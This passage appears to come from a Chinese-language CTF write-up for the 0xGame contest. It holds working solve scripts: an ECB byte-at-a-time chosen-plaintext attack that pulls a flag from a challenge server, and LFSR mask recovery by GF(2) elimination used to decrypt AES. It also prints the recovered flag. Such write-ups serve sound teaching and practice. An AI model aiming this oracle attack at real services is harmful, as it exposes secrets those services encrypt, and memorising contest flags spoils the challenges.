class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- 连接信息 ---</span></span><br><span class=\"line\">HOST = <span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span></span><br><span class=\"line\">PORT = <span class=\"number\">49725</span></span><br><span class=\"line\">BLOCK_SIZE = <span class=\"number\">16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- I/O 辅助函数 ---</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recv_until</span>(<span class=\"params\">s, delim</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;从 socket 中接收数据，直到遇到指定的分隔符 delim。&quot;&quot;&quot;</span></span><br><span class=\"line\">    data = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> data.endswith(delim):</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            chunk = s.recv(<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> chunk:  <span class=\"comment\"># 连接已关闭</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">            data += chunk</span><br><span class=\"line\">        <span class=\"keyword\">except</span> socket.timeout:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] Socket timeout.&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_encryption</span>(<span class=\"params\">s, payload_hex</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    在一个已建立的 socket 连接上，发送一次加密请求并获取结果。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 1. 回答 &#x27;y&#x27; 继续加密</span></span><br><span class=\"line\">        s.sendall(<span class=\"string\">b&#x27;y\\n&#x27;</span>)</span><br><span class=\"line\">        recv_until(s, <span class=\"string\">b&#x27;[-] Plaintext(in hex):&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 2. 发送我们的 payload</span></span><br><span class=\"line\">        s.sendall(payload_hex.encode() + <span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 3. 解析返回的密文</span></span><br><span class=\"line\">        recv_until(s, <span class=\"string\">b&#x27;[+] Ciphertext: &#x27;</span>)</span><br><span class=\"line\">        response_line = recv_until(s, <span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> response_line:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> response_line.strip().decode()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> (socket.error, BrokenPipeError):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] Network error occurred during communication.&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- 主攻击逻辑 ---</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>():</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    执行 ECB 逐字节攻击的主函数。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># 建立一个持久连接</span></span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s.settimeout(<span class=\"number\">5</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        s.connect((HOST, PORT))</span><br><span class=\"line\">        <span class=\"comment\"># 清理掉第一个 &quot;Continue?&quot; 提示</span></span><br><span class=\"line\">        recv_until(s, <span class=\"string\">b&#x27;y/[n])?&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.error <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] Failed to connect to <span class=\"subst\">&#123;HOST&#125;</span>:<span class=\"subst\">&#123;PORT&#125;</span>. Error: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    known_flag = <span class=\"string\">b&#x27;0xGame&#123;&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] Starting ECB byte-at-a-time attack with known prefix: <span class=\"subst\">&#123;known_flag.decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;-&quot;</span> * <span class=\"number\">50</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> known_flag.endswith(<span class=\"string\">b&#x27;&#125;&#x27;</span>):</span><br><span class=\"line\">            <span class=\"comment\"># 1. 对齐步骤 (Alignment)</span></span><br><span class=\"line\">            <span class=\"comment\"># 构造填充物 (padding)，其长度能让下一个未知字节恰好落在16字节块的末尾</span></span><br><span class=\"line\">            <span class=\"comment\"># 例如，当 known_flag 长度为7时, 我们需要 15-7=8 个 &#x27;A&#x27;</span></span><br><span class=\"line\">            padding_len = (BLOCK_SIZE - <span class=\"number\">1</span>) - (<span class=\"built_in\">len</span>(known_flag) % BLOCK_SIZE)</span><br><span class=\"line\">            padding = <span class=\"string\">b&#x27;A&#x27;</span> * padding_len</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 发送这个对齐用的 payload，获取目标密文</span></span><br><span class=\"line\">            <span class=\"comment\"># 服务器会加密: pad(padding + flag, 16)</span></span><br><span class=\"line\">            response_hex = get_encryption(s, padding.<span class=\"built_in\">hex</span>())</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> response_hex:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] Failed to get response from oracle during alignment.&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 我们感兴趣的密文块，是包含第一个未知字节的那一块</span></span><br><span class=\"line\">            <span class=\"comment\"># 它的索引可以通过 (padding长度 + 已知flag长度) / 16 来计算</span></span><br><span class=\"line\">            target_block_index = (<span class=\"built_in\">len</span>(padding) + <span class=\"built_in\">len</span>(known_flag)) // BLOCK_SIZE</span><br><span class=\"line\">            start_pos = target_block_index * BLOCK_SIZE * <span class=\"number\">2</span>  <span class=\"comment\"># 1字节=2个hex字符</span></span><br><span class=\"line\">            end_pos = start_pos + (BLOCK_SIZE * <span class=\"number\">2</span>)</span><br><span class=\"line\">            target_block = response_hex[start_pos:end_pos]</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 2. 爆破步骤 (Brute-force)</span></span><br><span class=\"line\">            found_char = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"comment\"># 优先尝试常见的 flag 字符集</span></span><br><span class=\"line\">            charset = (string.ascii_letters + string.digits + <span class=\"string\">&quot;_-!&#123;&#125;?@#$&quot;</span>).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> char_code <span class=\"keyword\">in</span> charset:</span><br><span class=\"line\">                guess_char = <span class=\"built_in\">bytes</span>([char_code])</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 构造测试 payload: padding + known_flag + guess</span></span><br><span class=\"line\">                <span class=\"comment\"># 服务器会加密: pad(padding + known_flag + guess + rest_of_flag, 16)</span></span><br><span class=\"line\">                <span class=\"comment\"># 这个构造使得 (padding + known_flag + guess) 组成一个或多个完整的块</span></span><br><span class=\"line\">                test_payload = padding + known_flag + guess_char</span><br><span class=\"line\">                </span><br><span class=\"line\">                test_response_hex = get_encryption(s, test_payload.<span class=\"built_in\">hex</span>())</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> test_response_hex:</span><br><span class=\"line\">                    <span class=\"comment\"># 如果单次请求失败，跳过这个字符，避免程序崩溃</span></span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 提取相同位置的密文块进行比较</span></span><br><span class=\"line\">                test_block = test_response_hex[start_pos:end_pos]</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"keyword\">if</span> test_block == target_block:</span><br><span class=\"line\">                    known_flag += guess_char</span><br><span class=\"line\">                    <span class=\"comment\"># 使用 &#x27;ignore&#x27; 以避免非UTF-8字符打印时出错</span></span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Found: &#x27;<span class=\"subst\">&#123;guess_char.decode(<span class=\"string\">&#x27;latin-1&#x27;</span>, <span class=\"string\">&#x27;ignore&#x27;</span>)&#125;</span>&#x27;  -&gt;  Flag: <span class=\"subst\">&#123;known_flag.decode(<span class=\"string\">&#x27;latin-1&#x27;</span>, <span class=\"string\">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    found_char = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> found_char:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] Attack failed. Could not find the next character in the charset.&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;-&quot;</span> * <span class=\"number\">50</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> known_flag.endswith(<span class=\"string\">b&#x27;&#125;&#x27;</span>):</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] Success! Full flag found: <span class=\"subst\">&#123;known_flag.decode(<span class=\"string\">&#x27;latin-1&#x27;</span>, <span class=\"string\">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] Attack stopped. Partial flag: <span class=\"subst\">&#123;known_flag.decode(<span class=\"string\">&#x27;latin-1&#x27;</span>, <span class=\"string\">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class=\"line\">        s.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    solve()</span><br></pre></td></tr></table></figure>\n\n<p>得到<code>0xGame&#123;5679df1b-4bae-4715-8433-4d52ccb258ef&#125;</code></p>\n<h2 id=\"LFSR\"><a href=\"#LFSR\" class=\"headerlink\" title=\"LFSR\"></a>LFSR</h2><p>线性反馈移位寄存器。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">int_to_bits</span>(<span class=\"params\">x, bit_length</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;将整数转为比特列表，高位在前&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> [(x &gt;&gt; i) &amp; <span class=\"number\">1</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(<span class=\"built_in\">range</span>(bit_length))]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bits_to_int</span>(<span class=\"params\">bits</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;将比特列表转为整数&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">str</span>(b) <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> bits), <span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lfsr_step</span>(<span class=\"params\">state, mask, length=<span class=\"number\">128</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;模拟LFSR的一步&quot;&quot;&quot;</span></span><br><span class=\"line\">    output = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(length):</span><br><span class=\"line\">        output ^= state[i] &amp; mask[i]</span><br><span class=\"line\">    new_state = state[<span class=\"number\">1</span>:] + [output]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_state, output</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recover_mask_from_keystream</span>(<span class=\"params\">keystream, n=<span class=\"number\">128</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;从密钥流恢复mask&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># 构建线性方程组: 对于 i = n 到 2n-1</span></span><br><span class=\"line\">    <span class=\"comment\"># keystream[i] = mask · [keystream[i-n], ..., keystream[i-1]]</span></span><br><span class=\"line\">    A = []</span><br><span class=\"line\">    b = []</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n, <span class=\"number\">2</span>*n):</span><br><span class=\"line\">        <span class=\"comment\"># 状态向量是前n个输出比特</span></span><br><span class=\"line\">        state_vector = keystream[i-n:i]</span><br><span class=\"line\">        A.append(state_vector)</span><br><span class=\"line\">        b.append(keystream[i])</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># GF(2)上的高斯消元</span></span><br><span class=\"line\">    size = n</span><br><span class=\"line\">    mat = [row + [b[i]] <span class=\"keyword\">for</span> i, row <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(A)]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 前向消元</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(size):</span><br><span class=\"line\">        <span class=\"comment\"># 找到主元</span></span><br><span class=\"line\">        pivot = -<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(col, size):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> mat[row][col] == <span class=\"number\">1</span>:</span><br><span class=\"line\">                pivot = row</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> pivot == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">            </span><br><span class=\"line\">        <span class=\"comment\"># 交换行</span></span><br><span class=\"line\">        mat[col], mat[pivot] = mat[pivot], mat[col]</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 消去其他行</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(col + <span class=\"number\">1</span>, size):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> mat[row][col] == <span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(col, size + <span class=\"number\">1</span>):</span><br><span class=\"line\">                    mat[row][j] ^= mat[col][j]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 回代求解</span></span><br><span class=\"line\">    mask = [<span class=\"number\">0</span>] * size</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(<span class=\"built_in\">range</span>(size)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mat[i][i] == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> mat[i][size] == <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 自由变量，设为0</span></span><br><span class=\"line\">                mask[i] = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;矛盾方程 at row <span class=\"subst\">&#123;i&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            mask[i] = mat[i][size]</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i + <span class=\"number\">1</span>, size):</span><br><span class=\"line\">                mask[i] ^= mat[i][j] &amp; mask[j]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> mask</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 已知数据</span></span><br><span class=\"line\">random1 = <span class=\"number\">79262982171792651683253726993186021794</span></span><br><span class=\"line\">random2 = <span class=\"number\">121389030069245976625592065270667430301</span></span><br><span class=\"line\">ciphertext = <span class=\"string\">b&#x27;\\xb9WE&lt;\\x8bC\\xab\\x92J7\\xa9\\xe6\\xe8\\xd8\\x93D\\xcc\\xac\\xfdvfZ&#125;C\\xe6\\xd8;\\xf7\\x18\\xbauz`\\xb9\\xe0\\xe6\\xc6\\xae\\x00\\xfb\\x96%;k&#123;Ph\\xfa&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;分析LFSR...&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查数值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;random1: <span class=\"subst\">&#123;random1&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;random2: <span class=\"subst\">&#123;random2&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;random1 比特长度: <span class=\"subst\">&#123;random1.bit_length()&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;random2 比特长度: <span class=\"subst\">&#123;random2.bit_length()&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 转为比特序列（确保128位）</span></span><br><span class=\"line\">bits1 = int_to_bits(random1, <span class=\"number\">128</span>)</span><br><span class=\"line\">bits2 = int_to_bits(random2, <span class=\"number\">128</span>)</span><br><span class=\"line\">keystream = bits1 + bits2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;密钥流长度: <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(keystream)&#125;</span> 比特&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法1: 直接解线性方程组</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n方法1: 解线性方程组...&quot;</span>)</span><br><span class=\"line\">mask_bits = recover_mask_from_keystream(keystream)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mask_bits:</span><br><span class=\"line\">    mask = bits_to_int(mask_bits)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;找到 mask: <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(mask)&#125;</span>&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 验证mask</span></span><br><span class=\"line\">    test_state = bits1[:]  <span class=\"comment\"># 初始状态是random1的比特</span></span><br><span class=\"line\">    test_mask = mask_bits</span><br><span class=\"line\">    generated = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        test_state, out = lfsr_step(test_state, test_mask)</span><br><span class=\"line\">        generated.append(out)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 检查是否匹配</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> generated[<span class=\"number\">128</span>:<span class=\"number\">256</span>] == bits2:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;✓ Mask 验证成功!&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;✗ Mask 验证失败&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 解密</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> order <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;big&#x27;</span>, <span class=\"string\">&#x27;little&#x27;</span>]:</span><br><span class=\"line\">        key = mask.to_bytes(<span class=\"number\">16</span>, order)</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">        plaintext = cipher.decrypt(ciphertext)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n<span class=\"subst\">&#123;order&#125;</span> 顺序解密:&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            decoded = plaintext.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>, errors=<span class=\"string\">&#x27;ignore&#x27;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;解码: <span class=\"subst\">&#123;decoded&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;0xGame&#x27;</span> <span class=\"keyword\">in</span> decoded <span class=\"keyword\">or</span> <span class=\"string\">&#x27;flag&#x27;</span> <span class=\"keyword\">in</span> decoded <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#123;&#x27;</span> <span class=\"keyword\">in</span> decoded:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;*** 找到 flag! ***&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;原始字节: <span class=\"subst\">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;方法1失败&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法2: 如果上面失败，尝试暴力搜索附近的mask值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n方法2: 尝试附近可能的mask值...&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mask_bits:</span><br><span class=\"line\">    base_mask = bits_to_int(mask_bits)</span><br><span class=\"line\">    <span class=\"comment\"># 尝试一些变体</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> shift <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">11</span>):</span><br><span class=\"line\">        test_mask = (base_mask + shift) &amp; ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">128</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> order <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;big&#x27;</span>, <span class=\"string\">&#x27;little&#x27;</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                key = 